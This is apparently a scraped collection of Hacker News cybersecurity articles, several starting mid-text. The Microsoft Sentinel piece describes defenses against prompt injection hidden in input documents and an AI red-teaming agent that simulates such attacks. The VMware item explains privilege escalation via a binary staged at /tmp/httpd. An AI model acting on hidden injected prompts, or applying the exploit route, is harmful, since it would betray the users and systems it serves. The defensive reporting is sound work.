In addition, the tech giant said it's also releasing a public preview of Sentinel Graph and Sentinel Model Context Protocol (MCP) server to turn telemetry into a security graph and allow AI agents access an organization's security context in a standardized manner.
""With graph-based context, semantic access, and agentic orchestration, Sentinel gives defenders a single platform to ingest signals, correlate across domains, and empower AI agents built in Security Copilot, VS Code using GitHub Copilot, or other developer platforms,"" Vasu Jakkal, corporate vice president at Microsoft Security, said in a post shared with The Hacker News.

Microsoft released Sentinel data lake in public preview earlier this July as a purpose-built, cloud-native tool to ingest, manage, and analyze security data to provide better visibility and advanced analytics.
With the data lake, the idea is to lay the foundation for an agentic defense by bringing data from diverse sources and enabling artificial intelligence (AI) models like Security Copilot to have the full context necessary to detect subtle patterns, correlate signals, and surface high-fidelity alerts.

The shift, Redmond added, allows security teams to uncover attacker behavior, retroactively hunt over historical data, and trigger detections automatically based on the latest tradecraft.
""Sentinel ingests signals, either structured or semi-structured, and builds a rich, contextual understanding of your digital estate through vectorized security data and graph-based relationships,"" Jakkal said.
""By integrating these insights with Defender and Purview, Sentinel brings graph-powered context to the tools security teams already use, helping defenders trace attack paths, understand impact, and prioritize response -- all within familiar workflows.""
Microsoft further noted that Sentinel organizes and enriches security data so as to detect issues faster and better respond to events at scale, shifting cybersecurity from ""reactive to predictive.""
In addition, the company said users can build Security Copilot agents in a Sentinel MCP server-enabled coding platform, such as VS Code, using GitHub Copilot, that are tailored to their organizational workflows.
The Windows maker has also emphasized the need for securing AI platforms and implementing guardrails to detect (cross-)prompt injection attacks, stating it intends to roll out new enhancements to Azure AI Foundry that incorporate more protection for AI agents against such risks.
Microsoft told The Hacker News that it enforced security and compliance across its data lake by using Azure and Entra RBAC for least-privilege access, storing data in the same region as the connected workspace to meet data residency requirements, and encrypting all data at rest using Microsoft-managed keys by default, with options to use customer-managed keys (CMK). It also said each tenant receives a logically isolated data lake instance.

To counter the risks associated with prompt injection attacks, the company said it's securing the platform through a multi-pronged approach that involves threat protection for AI services in Microsoft Defender for Cloud, Spotlighting in Azure AI Content Safety, and Azure AI Red Teaming Agent.
These features are engineered to provide advanced security for custom AI applications built with Azure AI Foundry models, real-time detection and blocking of prompt injection attacks, and automated adversarial testing of AI systems to identify vulnerabilities in content safety.
""The [threat protection] feature proactively detects and responds to threats, including prompt injection attacks by generating actionable alerts,"" Microsoft said. ""It helps organizations safeguard their AI services from malicious inputs that could compromise model behavior or data integrity.""
How AI Red Teaming works
Spotlighting, on the other hand, enhances protection against indirect attacks by tagging the input documents with special formatting to indicate lower trust in the model. ""This capability ensures that Azure AI Foundry models do not act on hidden or malicious prompts embedded in user inputs,"" the company added. ""By continuously monitoring and filtering unsafe content, Spotlighting helps maintain the integrity and trustworthiness of AI-generated outputs.""
Lastly, the third layer of defense comes in the form of an AI Red Teaming Agent, which Microsoft released in preview back in April 2025 as a tool to help users proactively find safety risks associated with generative AI systems during design and development. It integrates the company's open-source Python Risk Identification Tool (PyRIT) with Azure AI Foundry's built-in Risk and Safety Evaluations to assess safety issues.
""Users can simulate prompt injection scenarios and other attack strategies to evaluate how well their models detect and respond to threats,"" Microsoft said. ""This tool supports proactive risk assessment and strengthens the resilience of AI applications against evolving adversarial techniques.""

2025-10-06 11:11:44,"Sep 30, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/stop-alert-chaos-context-is-key-to.html,Stop Alert Chaos: Context Is the Key to Effective Incident Response,"The Problem: Legacy SOCs and Endless Alert Noise
Every SOC leader knows the feeling: hundreds of alerts pouring in, dashboards lighting up like a slot machine, analysts scrambling to keep pace. The harder they try to scale people or buy new tools, the faster the chaos multiplies. The problem is not just volume; it is the model itself. Traditional SOCs start with rules, wait for alerts to fire, and then dump raw signals on analysts. By the time someone pieces together what is really happening, the attacker has already moved on, or moved in. It is a broken loop of noise chasing noise.
Flipping the Model: Context Over Chaos
Instead of drowning in raw events, treat every incoming signal as a potential opening move in a bigger story. Logs from identity systems, endpoints, cloud workloads, and SIEMs do not just land in separate dashboards; they are normalized, connected, and enriched to form a coherent investigation. A brute-force login attempt on its own is easy to dismiss. But when enhanced with user history, IP reputation, and signs of lateral movement, it is no longer background noise. It becomes the first chapter of an unfolding breach. 
Context is the difference between ignoring another failed login and stopping an attack in motion.
Enabling Analysts with Story-Driven Workflows
The goal is not to hand analysts a bigger stack of alerts, it is to give them a story that already has shape and meaning. When analysts open a case, they see how the activity fits together, what actors are involved, and what paths the threat has already taken. Instead of starting from scratch with scattered evidence, they begin with a clear picture that guides their judgment. That shift changes the nature of the job itself.
Human-Centric AI That Enhances, Not Replaces
This is not about replacing humans with AI. It is about giving humans the space to actually do security. When technology handles the grind of collecting, correlating, and enriching signals, analysts can focus on what they do best: interpreting meaning, thinking creatively, and applying institutional knowledge. 

Junior analysts can develop investigative reasoning by studying complete cases instead of clicking through endless queues,
Mid-level analysts gain time to hunt and test new hypotheses
Senior analysts focus on attacker behavior and strategy, shaping how defenses evolve. 

The work stops feeling like endless triage and starts feeling like security again.
Measurable Results: Faster MTTR, Fewer False Positives
The results are measurable and dramatic. False positives drop sharply. Mean time to resolution shrinks from hours to minutes. Quality and accuracy shoot up. Teams finally have the capacity to investigate the subtle, low-level signals where attackers often make their first moves. 
That is what happens when SOC teams stop chasing alerts and start building context.
Defining the Cognitive SOC
A SOC that thrives is not the one with the most dashboards or the biggest analyst headcount. It is the one that can learn and adapt, quickly turn signals into stories, make confident decisions, and act before chaos spirals. That is the promise of a ""cognitive SOC."" Technology organizes the noise, and analysts deliver the answers.
Moving from Alert Chaos to Contextual Clarity
Conifers helps enterprises and MSSP security business leaders escape the tradeoff between effectiveness and efficiency with CognitiveSOC™, an AI SOC agent platform that scales investigations with intelligence and context. Instead of drowning analysts in noisy alerts or forcing MSSPs to sacrifice margins, Conifers blends agentic AI, advanced data science, and human oversight with an organization's own institutional knowledge to automate end-to-end, multi-tier investigations with reasoning and intent. By mapping incidents to use cases and dynamically applying the right AI techniques, CognitiveSOC produces contextual, evidence-backed outputs that align with each organization's risk profile and analyst preferences. This results in faster, higher-quality investigations and decision-making, reduced alert fatigue, and improved SOC outcomes at scale. More context, less chaos.

The vulnerability in question is CVE-2025-41244 (CVSS score: 7.8), a local privilege escalation bug affecting the following versions -

VMware Cloud Foundation 4.x and 5.x
VMware Cloud Foundation 9.x.x.x
VMware Cloud Foundation 13.x.x.x (Windows, Linux)
VMware vSphere Foundation 9.x.x.x
VMware vSphere Foundation 13.x.x.x (Windows, Linux)
VMware Aria Operations 8.x
VMware Tools 11.x.x, 12.x.x, and 13.x.x (Windows, Linux)
VMware Telco Cloud Platform 4.x and 5.x
VMware Telco Cloud Infrastructure 2.x and 3.x


""A malicious local actor with non-administrative privileges having access to a VM with VMware Tools installed and managed by Aria Operations with SDMP enabled may exploit this vulnerability to escalate privileges to root on the same VM,"" VMware said in an advisory released Monday.
The fact that it's a local privilege escalation means that the adversary will have to secure access to the infected device through some other means.
NVISO researcher Maxime Thiebaut has been credited for discovering and reporting the shortcoming on May 19, 2025, during an incident response engagement. The company also said VMware Tools 12.4.9, which is part of VMware Tools 12.5.4, remediates the issue for Windows 32-bit systems, and that a version of open-vm-tools that addresses CVE-2025-41244 will be distributed by Linux vendors.
The vulnerable get_version() function
While Broadcom makes no mention of it being exploited in real-world attacks, NVISO Labs attributed the activity to a China-linked threat actor Google Mandiant tracks as UNC5174 (aka Uteus or Uetus), which has a track record of exploiting various security flaws, including those impacting Ivanti and SAP NetWeaver, to obtain initial access to target environments.
""When successful, exploitation of the local privilege escalation results in unprivileged users achieving code execution in privileged contexts (e.g., root),"" Thiebaut said. ""We can however not assess whether this exploit was part of UNC5174's capabilities or whether the zero-day's usage was merely accidental due to its trivialness.""
NVISO said the vulnerability is rooted in a function called ""get_version()"" that takes a regular expression (regex) pattern as input for each process with a listening socket, checks whether the binary associated with that process matches the pattern, and, if so, invokes the supported service's version command.
""While this functionality works as expected for system binaries (e.g., /usr/bin/httpd), the usage of the broad‑matching \S character class (matching non‑whitespace characters) in several of the regex patterns also matches non-system binaries (e.g., /tmp/httpd),"" Thiebaut explained. ""These non-system binaries are located within directories (e.g., /tmp) which are writable to unprivileged users by design.""

As a result, this opens the door to potential abuse by an unprivileged local attacker by staging the malicious binary at ""/tmp/httpd,"" resulting in privilege escalation when the VMware metrics collection service is executed. All a bad actor requires to abuse the flaw is to ensure that the binary is run by an unprivileged user and it opens a random listening socket.
The Brussels-based cybersecurity company noted that it observed UNC5174 using the ""/tmp/httpd"" location to stage the malicious binary and spawn an elevated root shell and achieve code execution. The exact nature of the payload executed using this method is unclear at this stage.
When reached for comment, NVISO Labs told The Hacker News that it has opted not to share any additional specifics about the payload being run following the exploitation of CVE-2025-41244 for now.
""The broad practice of mimicking system binaries (e.g., httpd) highlights the real possibility that several other malware strains have accidentally been benefiting from unintended privilege escalations for years,"" Thiebaut said.

2025-10-06 11:11:49,"Sep 30, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/new-android-trojan-datzbro-tricking.html,"New Android Trojan ""Datzbro"" Tricking Elderly with AI-Generated Facebook Travel Events","Cybersecurity researchers have flagged a previously undocumented Android banking trojan called Datzbro that can conduct device takeover (DTO) attacks and perform fraudulent transactions by preying on the elderly.
Dutch mobile security company ThreatFabric said it discovered the campaign in August 2025 after users in Australia reported scammers managing Facebook groups promoting ""active senior trips."" Some of the other territories targeted by the threat actors include Singapore, Malaysia, Canada, South Africa, and the U.K.
The campaigns, it added, specifically focused on elderly people looking for social activities, trips, in-person meetings, and similar events. These Facebook groups have been found to share artificial intelligence (AI)-generated content, claiming to organize various activities for seniors.
Should prospective targets express willingness to participate in these events, they are subsequently approached via Facebook Messenger or WhatsApp, where they are asked to download an APK file from a fraudulent link (e.g., ""download.seniorgroupapps[.]com"").
""The fake websites prompted visitors to install a so-called community application, claiming it would allow them to register for events, connect with members, and track scheduled activities,"" ThreatFabric said in a report shared with The Hacker News.
Interestingly, the websites have also been found to contain placeholder links to download an iOS application, indicating that the attackers are looking to target both the mobile operating systems, distributing TestFlight apps for iOS and trick victims into downloading them.

Should the victim click on the button to download the Android application, it either leads to the direct deployment of the malware on their devices, or that of a dropper that's built using an APK binding service dubbed Zombinder to bypass security restrictions on Android 13 and later.
Some of the Android apps that have been found distributing Datzbro are listed below -

Senior Group (twzlibwr.rlrkvsdw.bcfwgozi)
Lively Years (orgLivelyYears.browses646)
ActiveSenior (com.forest481.security)
DanceWave (inedpnok.kfxuvnie.mggfqzhl)
作业帮 (io.mobile.Itool）
麻豆传媒 (fsxhibqhbh.hlyzqkd.aois
麻豆传媒 (mobi.audio.aassistant)
谷歌浏览器 (tvmhnrvsp.zltixkpp.mdok)
MT管理器 (varuhphk.vadneozj.tltldo)
MT管理器 (spvojpr.bkkhxobj.twfwf)
大麦 (mnamrdrefa.edldylo.zish)
MT管理器 (io.red.studio.tracker)

The malware, like other Android banking trojans, has a wide range of capabilities to record audio, capture photos, access files and photos, and conduct financial fraud through remote control, overlay attacks, and keylogging. It also relies on Android's accessibility services to perform remote actions on the victim's behalf.


A notable feature of Datzbro is the schematic remote control mode, which allows the malware to send information about all the elements displayed on the screen, their position, and content, so as to allow the operators to re-create the layout at their end and effectively commandeer the device.
The banking trojan can also serve as a semi-transparent black overlay with custom text so as to hide the malicious activity from a victim, as well as steal the device lock screen PIN and passwords associated with Alipay and WeChat. Furthermore, it scans accessibility event logs for package names related to banks or cryptocurrency wallets, and for text containing passwords, PINs, or other codes.
""Such a filter clearly shows the focus of the developers behind Datzbro, not only using its Spyware capabilities, but also turning it into a financial threat,"" ThreatFabric said. ""With the help of keylogging capabilities, Datzbro can successfully capture login credentials for mobile banking applications entered by unsuspecting victims.""

It's believed that Datzbro is the work of a Chinese-speaking threat group, given the presence of Chinese debug and logging strings in the malware source code. The malicious apps have been found to be connected to a command-and-control (C2) backend that's a Chinese-language desktop application, making it stand apart from other malware families that rely on web-based C2 panels.
ThreatFabric said a compiled version of the C2 app has been uploaded to a public virus share, suggesting that the malware may have been leaked and is being distributed freely among cybercriminals.

""The discovery of Datzbro highlights the evolution of mobile threats targeting unsuspecting users through social engineering campaigns,"" the company said. ""By focusing on seniors, fraudsters exploit trust and community-oriented activities to lure victims into installing malware. What begins as a seemingly harmless event promotion on Facebook can escalate into device takeover, credential theft, and financial fraud.""
The disclosure comes as IBM X-Force detailed an AntiDot Android banking malware campaign codenamed PhantomCall that has targeted users of major financial institutions globally, spanning Spain, Italy, France, the U.S., Canada, the U.A.E., and India, using fake Google Chrome dropper apps that can get around Android 13's controls that prevent sideloaded apps from exploiting accessibility APIs.
According to an analysis published by PRODAFT in June 2025, AntiDot is attributed to a financially motivated threat actor called LARVA-398 and is available to others under a Malware-as-a-Service (MaaS) model on underground forums.
The latest campaign is designed to make use of the CallScreeningService API to monitor incoming calls and selectively block them based on a dynamically generated list of phone numbers stored in the phone's shared preferences, effectively allowing the attackers to prolong unauthorized access, complete fraudulent transactions, or delay detection.
""PhantomCall also enables attackers to initiate fraudulent activity by silently sending USSD codes to redirect calls, while abusing Android's CallScreeningService to block legitimate incoming calls, effectively isolating victims and enabling impersonation,"" security researcher Ruby Cohen said.
""These capabilities play a critical role in orchestrating high-impact financial fraud by cutting off victims from real communication channels and enabling attackers to act on their behalf without raising suspicion.""
Update
Google shared the below statement with The Hacker News following the publication of the story -
Android users are automatically protected against known versions of this malware by Google Play Protect, which is on by default on Android devices with Google Play Services. Google Play Protect can warn users or block apps known to exhibit malicious behavior, even when those apps come from sources outside of Play.

Gen-AI adoption is accelerating at an unprecedented pace, and SaaS vendors are embedding powerful LLMs directly into their platforms. Organizations are embracing AI-powered applications across every function, from marketing and development to finance and HR. This transformation unlocks innovation and efficiency, but it also introduces new risks. Enterprises must balance the promise of AI with the responsibility to protect their data, maintain compliance, and secure their expanding application supply chain.
The New Risk Landscape
With AI adoption comes a new set of challenges:

AI Sprawl: Employees adopt AI tools independently, often without security oversight, creating blind spots and unmanaged risks.
Supply Chain Vulnerabilities: interapplication integrations between AI tools and enterprise resources expand the attack surface and introduce dependencies and access paths enterprises can't easily control.
Data Exposure Risks: Sensitive information is increasingly shared with external AI services, raising concerns about leakage, misuse, or unintentional data retention.

This evolving risk landscape makes clear that AI security requires more than traditional defenses.
AI Demands a New Security Paradigm
AI is transforming the enterprise landscape at an unprecedented pace, bringing both opportunity and risk. As organizations adopt AI-powered applications across departments, the uncontrolled spread of these tools creates blind spots, increases supply chain vulnerabilities, and raises the likelihood of data exposure.

The cryptocurrency seizure, amounting to 61,000 Bitcoin, is believed to be the single largest such effort in the world, the Metropolitan Police said.
Zhimin Qian (aka Yadi Zhang), 47, pleaded guilty at Southwark Crown Court on Monday to offenses related to acquiring and possessing criminal property (i.e., cryptocurrency). She is expected to be sentenced at a later date.
The Met Police said the seizure was the result of a probe launched in 2018 after it received a tip-off about the transfer of criminal assets, with the agency accusing Zhang of orchestrating a large-scale fraud in China between 2014 and 2017 that defrauded more than 128,000 victims. According to Sky News, Zhang was arrested in April 2024.

The scheme essentially duping victims, mostly between 50 and 75 years old, into investing their funds with false promises of daily dividends and guaranteed profits, after which the proceeds are converted into Bitcoin.
""She then fled China using false documents and entered the U.K., where in September 2018 she attempted to launder the proceeds via purchasing property, with the assistance of an assailant, Jian Wen,"" the agency noted.
Wen was also jailed for six years and eight months last May for her role in the operation, which involved facilitating the movement of a cryptocurrency wallet that contained 150 Bitcoin, then valued at £1.7 million ($2.28 million). Earlier this January, Wen was ordered to pay back more than £3.1 million ($4.16 million) or face extra time in jail. 
Operation Contender 3.0 Targets Romance Scams and Sextortion in 14 African Countries
The development comes as INTERPOL said authorities in 14 African countries arrested 260 suspects and seized 1,235 electronic devices as part of a coordinated international operation dubbed Contender 3.0 that took place between July 28 and August 11, 2025, to tackle cyber-enabled crime.
Countries that participated in the activity included Angola, Benin, Burkina Faso, Cote d'Ivoire, Gambia, Ghana, Guinea, Kenya, Nigeria, Rwanda, Senegal, South Africa, Uganda, and Zambia.
""The crackdown targeted transnational criminal networks exploiting digital platforms, particularly social media, to manipulate victims and defraud them financially,"" it said. ""Specifically, the operation focused on romance scams, where perpetrators build online relationships to extract money from victims, and sextortion, in which victims are blackmailed with explicit images or videos.""
The illicit activities have claimed 1,463 victims, resulting in losses of $2.8 million. The arrests were carried out in Ghana, Senegal, Cote d'Ivoire, and Angola. The suspects were found to use fake profiles, forged identities, and stolen images to deceive victims and pull off the scams and, in some cases, trick individuals into sharing intimate images.

Alongside the arrests, USB drives, SIM cards, and forged documents used by the suspects to support their criminal activities were seized by officials. It also resulted in the dismantling of 81 cybercrime infrastructures across the continent.
Group-IB, which was one of the private sector entities to support the operation along with Trend Micro, said it provided intelligence on the perpetrators who targeted and interacted with victims of romance scams and digital sextortion. It also said it shared details regarding the payment data used by these criminals in their extortion attempts.
""Cybercrime units across Africa are reporting a sharp rise in digital-enabled crimes such as sextortion and romance scams,"" Cyril Gout, acting executive director of Police Services at INTERPOL, said. ""The growth of online platforms has opened new opportunities for criminal networks to exploit victims, causing both financial loss and psychological harm."""

The vulnerability in question is CVE-2025-32463 (CVSS score: 9.3), which affects Sudo versions prior to 1.9.17p1. It was disclosed by Stratascale researcher Rich Mirch back in July 2025.
""Sudo contains an inclusion of functionality from an untrusted control sphere vulnerability,"" CISA said. ""This vulnerability could allow a local attacker to leverage sudo's -R (--chroot) option to run arbitrary commands as root, even if they are not listed in the sudoers file.""

CVE-2025-59689 - Libraesva Email Security Gateway (ESG) contains a command injection vulnerability that allows command injection via a compressed email attachment. (Disclosed as exploited by Libraesva last week)

In light of active exploitation, Federal Civilian Executive Branch (FCEB) agencies relying on the affected products are advised to apply the necessary mitigations by October 20, 2025, to secure their networks."
2025-10-06 11:11:58,"Sep 29, 2025",The Hacker News,https://thehackernews.com,https://thehackernews.com/2025/09/evilai-malware-masquerades-as-ai-tools.html,EvilAI Malware Masquerades as AI Tools to Infiltrate Global Organizations,"Threat actors have been observed using seemingly legitimate artificial intelligence (AI) tools and software to sneakily slip malware for future attacks on organizations worldwide.
According to Trend Micro, the campaign is using productivity or AI-enhanced tools to deliver malware targeting various regions, including Europe, the Americas, and the Asia, Middle East, and Africa (AMEA) region.
Manufacturing, government, healthcare, technology, and retail are some of the top sectors affected by the attacks, with India, the U.S., France, Italy, Brazil, Germany, the U.K., Norway, Spain, and Canada emerging as the regions with the most infections, indicating a global spread.
""This swift, widespread distribution across multiple regions strongly indicates that EvilAI is not an isolated incident but rather an active and evolving campaign currently circulating in the wild,"" security researchers Jeffrey Francis Bonaobra, Joshua Aquino, Emmanuel Panopio, Emmanuel Roll, Joshua Lijandro Tsang, Armando Nathaniel Pedragoza, Melvin Singwa, Mohammed Malubay, and Marco Dela Vega said.
The campaign has been codenamed EvilAI by Trend Micro, describing the attackers behind the operation as ""highly capable"" owing to their ability to blur the line between authentic and deceptive software for malware distribution and their ability to conceal its malicious features in otherwise functional applications.
Some of the programs distributed using the method include AppSuite, Epi Browser, JustAskJacky, Manual Finder, OneStart, PDF Editor, Recipe Lister, and Tampered Chef. Some aspects of the campaign were documented in detail by Expel, G DATA, and TRUESEC last month.

What's significant about the campaign is the lengths to which the attackers have gone to make these apps appear authentic and ultimately carry out a slew of nefarious activities in the background once installed, without raising any red flags. The deception is further enhanced by the use of signing certificates from disposable companies, as older signatures are revoked.

""EvilAI disguises itself as productivity or AI-enhanced tools, with professional-looking interfaces and valid digital signatures that make it difficult for users and security tools to distinguish it from legitimate software,"" Trend Micro said.
The end goal of the campaign is to conduct extensive reconnaissance, exfiltrate sensitive browser data, and maintain encrypted, real-time communication with its command-and-control (C2) servers using AES-encrypted channels to receive attacker commands and deploy additional payloads.
It essentially makes use of several propagation methods, including using newly registered websites that mimic vendor portals, malicious ads, SEO manipulation, and promoted download links on forums and social media.
EvilAI, per Trend Micro, is used as a stager, chiefly acting as a conduit to gain initial access, establish persistence, and prepare the infected system for additional payloads, while taking steps to enumerate installed security software and hinder analysis.
""Rather than relying on obviously malicious files, these trojans mimic the appearance of real software to go unnoticed into both corporate and personal environments, often gaining persistent access before raising any suspicion,"" the company said. ""This dual-purpose approach ensures the user's expectations are met, further lowering the chance of suspicion or investigation.""

Further analysis by G GATA has also determined that the threat actors behind OneStart, ManualFinder, and AppSuite are the same and that the server infrastructure is shared for distributing and configuring all these programs.
""They have been peddling malware disguised as games, print recipe, recipe finder, manual finder, and lately, adding the buzzword 'AI' to lure users,"" security researcher Banu Ramakrishnan said.
Expel said the developers behind AppSuite and PDF Editor campaigns have used at least 26 code-signing certificates issued for companies in Panama and Malaysia, among others, over the last seven years to make their software appear legitimate.
The cybersecurity company is tracking the malware signed using these certificates under the name BaoLoader, adding it's different from TamperedChef, citing differences in the behavioral differences and the certificate patterns.
""BaoLoader is primarily a backdoor which allows the operator to execute whatever they want on a system,"" Expel told The Hacker News. ""We believe their primary use up to this point has been advertising fraud. The actors behind the malware work as an affiliate distributor for legitimate software, but are using the backdoor to install the applications.
""The applications we have seen include browser extensions and a residential proxy. We’ve reached out to the organizations whose software is being installed.""
Expel also pointed out that EvilAI is a much broader category that includes BaoLoader alongside other malware, and that the malicious software distributed under the EvilAI label can be viewed as distinct campaigns, suggesting that this could be part of a much bigger infrastructure.
""Each malware campaign has its own developer, delivery infrastructure, and objectives,"" the company said. ""Distinguishing between them helps us better understand different risks and the people behind them.""
It's worth noting that the name TamperedChef was first attributed to a malicious recipe application that's configured to set up a stealthy communication channel with a remote server and receive commands that facilitate data theft.

Another aspect worth mentioning here is that the malware that TRUESEC tracks as TamperedChef is actually BaoLoader. The malware, as previously highlighted by G DATA, consists of a core backdoor component that provides the main functionality, including facilitating advertising fraud.
""TamperedChef used code-signing certificates issued to companies in Ukraine and Great Britain while BaoLoader consistently used certificates from Panama and Malaysia,"" the company pointed out.
And that's not all. Field Effect and GuidePoint Security have since uncovered more digitally signed binaries that masquerade as calendar and image viewer tools, and make use of the NeutralinoJS desktop framework to execute arbitrary JavaScript code and siphon sensitive data. These applications deploy the original TamperedChef malware, Expel said.
""The use of NeutralinoJS to execute JavaScript payloads and interact with native system APIs enabled covert file system access, process spawning, and network communication,"" Field Effect said. ""The malware's use of Unicode homoglyphs to encode payloads within seemingly benign API responses allowed it to bypass string-based detection and signature matching.""
The Canadian cybersecurity company said the presence of several code-signing publishers across multiple samples suggests either a shared malware-as-a-service provider or a code-signing marketplace that facilitates broad distribution.
""The TamperedChef campaign illustrates how threat actors are evolving their delivery mechanisms by weaponizing potentially unwanted applications, abusing digital code signing, and deploying covert encoding techniques,"" it said. ""These tactics allow malware to masquerade as legitimate software, bypass endpoint defenses, and exploit user trust.""

Nimbus Manticore Uses MiniJunk in Critical Infra Attacks — An Iran-aligned cyber espionage group has expanded its operations beyond its traditional Middle Eastern hunting grounds to target critical infrastructure organizations across Western Europe using constantly evolving malware variants and attack tactics. Nimbus Manticore, which overlaps with UNC1549 or Smoke Sandstorm, has been observed targeting defense manufacturing, telecommunications, and aviation companies in Denmark, Portugal, and Sweden. Central to the campaign are MiniJunk, an obfuscated backdoor that gives the attacker persistent access to infected systems, and MiniBrowse, a lightweight stealer with separate versions for stealing credentials from Chrome and Edge browsers. MiniJunk is an updated version of MINIBIKE (aka SlugResin), with the emails directing victims to fake job-related login pages that appear to be associated with companies like Airbus, Boeing, Flydubai, and Rheinmetall. In a further escalation of its tactics, Nimbus Manticore has been observed using the service SSL.com starting around May 2025 to sign their code and pass off malware as legitimate software programs, leading to a ""drastic decrease in detections."" 
ShadowV2 Targets Docker for DDoS Attacks — A novel ShadowV2 bot campaign is turning distributed denial-of-service (DDoS) attacks into a full-blown for-hire business by targeting misconfigured Docker containers on AWS. Instead of relying on prebuilt malicious images, the attackers build containers on the victim's machine itself to launch a Go-based RAT that can launch DDoS attacks. The exact rationale of the approach is unclear, though Darktrace researchers suggest it may have been a way to reduce forensic traces from importing a malicious container. Once installed, the malware sends a heartbeat signal to the C2 server every second, while also polling for new attack commands every five seconds.
Cloudflare Mitigates Largest DDoS Attack on Record — Web performance and security company Cloudflare said its systems blocked a record-breaking distributed denial-of-service (DDoS) attack that peaked at 22.2 terabits per second (Tbps) and 10.6 billion packets per second (Bpps), and lasted only 40 seconds. The attack was aimed at a single IP address of an unnamed European network infrastructure company. It's believed that the attack may be powered by the AISURU botnet.
Vane Viper Linked to Malicious Campaigns Distributing Malware — A high-volume cybercrime operation known as Vane Viper that's been active for more than a decade is supported by a commercial digital advertising platform with a checkered past. Vane Viper takes advantage of hundreds of thousands of compromised websites and malicious ads that redirect unsuspecting Web users to destinations such as exploit kits, malware, and sketchy websites. The findings suggest that Vane Viper is not acting as an unwitting intermediary but is a complicit enabler and active participant in malicious operations. It also shares parallels with VexTrio Viper in that both emerged from Eastern Europe around 2015 and are controlled by the Russian diaspora in Europe and Cyprus. ""URL Solutions, Webzilla, and AdTech Holding form a closely connected trio of firms: domains registered en masse via a registrar steeped in cybercrime, hosted on infrastructure operated by a company that's hosted everything from Methbot to state-sponsored disinformation, and payloads delivered via an ad network long implicated in malvertising,"" Infoblox said. ""Not only has PropellerAds turned a 'blind eye' to criminal abuse of their platform, but indicators [...] suggest – with moderate-to-high confidence – that several ad-fraud campaigns originated from infrastructure attributed to PropellerAds.""
2 New Supermicro BMC Bugs Allow Implanting Malicious Firmware — Servers running on motherboards sold by Supermicro contain medium-severity vulnerabilities that can allow hackers to remotely install malicious firmware that runs even before the operating system, providing unprecedented persistence. That said, the caveat is that the threat actor needs to have administrative access to the BMC control interface to perform the update, or distribute them as part of a supply chain attack by compromising the servers used to host firmware updates and replacing the original images with malicious ones, all while keeping the signature valid. Supermicro said it has updated the BMC firmware to mitigate the vulnerabilities, adding that it's currently testing and validating affected products. The current status of the update is unknown.

Microsoft Offers ESU for Free in the E.U. — Microsoft has decided to offer free extended security updates for Windows 10 users in the European Economic Area (EEA), following pressure from the Euroconsumers group. ""We are pleased to learn that Microsoft will provide a no-cost Extended Security Updates (ESU) option for Windows 10 consumer users in the European Economic Area (EEA),"" Euroconsumers said. In other regions, users will need to either enable Windows Backup or pay $30 for the year or redeem 1,000 Microsoft Reward points. It's worth noting that Windows 10 reached end of support (EoS) on October 14, 2025.
Olymp Loader Spotted in the Wild — A new malware loader called Olymp Loader has been spotted in the wild, being propagated via GitHub repositories, or through tools disguised as popular software such as PuTTY, OpenSSL, Zoom, and even a Counter Strike mod called Classic Offensive. Written in assembly language, the malware-as-a-service (MaaS) solution provides built-in stealer modules, including a custom version of BrowserSnatch that's available on GitHub. Campaigns using Olymp have been found to deliver an array of information stealers and remote access trojans like Lumma, Raccoon, WebRAT (aka SalatStealer), and Quasar RAT. The tool was first advertised by a seller named OLYMPO in HackForums on June 5, 2025, as a botnet, before evolving into a loader and a crypter. ""The malware seller has published a roadmap that treats Olymp as a bundle comprising Olymp Botnet, Olymp Loader, Olymp Crypter, an install service, and a file‑scanning tool for antivirus testing,"" Outpost24 said. ""It remains to be seen whether OLYMPO can sustain and support a broader malware product suite over time."" Regardless, the emergence of yet another bundled crimeware stack can further lower the entry barrier for less experienced threat actors, allowing them to mount widespread campaigns at scale within a short amount of time.
Malicious Facebook Ads Lead to JSCEAL Malware — Cybersecurity researchers have disclosed an ongoing campaign that's using bogus ads on Facebook and Google to distribute premium versions of trading platforms like TradingView for free. According to Bitdefender, the activity has also expanded to YouTube, where sponsored ads on the platform are being used to direct users to malware-laced downloads that steal credentials and compromise accounts. These ads are posted via legitimate-but-compromised verified YouTube accounts to serve the ads. The attackers take pains to ensure that the hijacked channels mimic the official TradingView channel by reusing the latter's branding and playlists to build credibility. An unlisted video uploaded by the rebranded channel, titled ""Free TradingView Premium – Secret Method They Don't Want You to Know,"" is estimated to have racked up more than 182,000 views through aggressive advertising. ""The unlisted status is deliberate, of course. By not being publicly searchable, these malicious videos avoid casual reporting and platform moderation,"" Bitdefender said. ""Instead, they are shown exclusively through ad placements, ensuring they reach their targets while remaining hidden from public view."" The attacks ultimately led to the deployment of malware known as JSCEAL (aka WEEVILPROXY) to steal sensitive data.
LockBit 5.0 Analyzed — The threat actors behind the LockBit ransomware have released a ""significantly more dangerous"" version, LockBit 5.0, on its sixth anniversary, with advanced obfuscation and anti-analysis techniques, while being capable of targeting Windows, Linux, and ESXi systems. ""The 5.0 version also shares code characteristics with LockBit 4.0, including identical hashing algorithms and API resolution methods, confirming this is an evolution of the original codebase rather than an imitation,"" Trend Micro said. ""The preservation of core functionalities while adding new evasion techniques demonstrates the group's strategy of incremental improvement to their ransomware platform."" LockBit may not be the most prolific ransomware group it once was ever since its infrastructure was disrupted in a law enforcement operation early last year, but the findings show that it continues to be as aggressive as ever when it comes to refining and retooling its tactics. ""The Windows binary uses heavy obfuscation and packing: it loads its payload through DLL reflection while implementing anti-analysis techniques like ETW patching and terminating security services,"" the company said. ""Meanwhile, the newly discovered Linux variant maintains similar functionality with command-line options for targeting specific directories and file types. The ESXi variant specifically targets VMware virtualization environments, designed to encrypt entire virtual machine infrastructures in a single attack.""
Microsoft Blocks Access to Services Used by Israeli Military Unit — Microsoft has revealed that it ""ceased and disabled"" a set of services to Unit 8200 within the Israel Ministry of Defense (IMOD) that were used to enable mass surveillance of civilians in Gaza and the West Bank. It said it found evidence ""relating to IMOD consumption of Azure storage capacity in the Netherlands and the use of AI services."" The secretive contract came to light last month following a report by The Guardian, along with +972 Magazine and Local Call, that revealed how Microsoft's Azure service was being used to store and process millions of Palestinian civilian phone calls made each day in Gaza and the West Bank. The newspaper reported that the trove of intercepted calls amounted to 8,000 terabytes of data and was held in a Microsoft data center in the Netherlands. The collected data has been moved out of the country and is being planned to be transferred to the Amazon Web Services cloud platform.
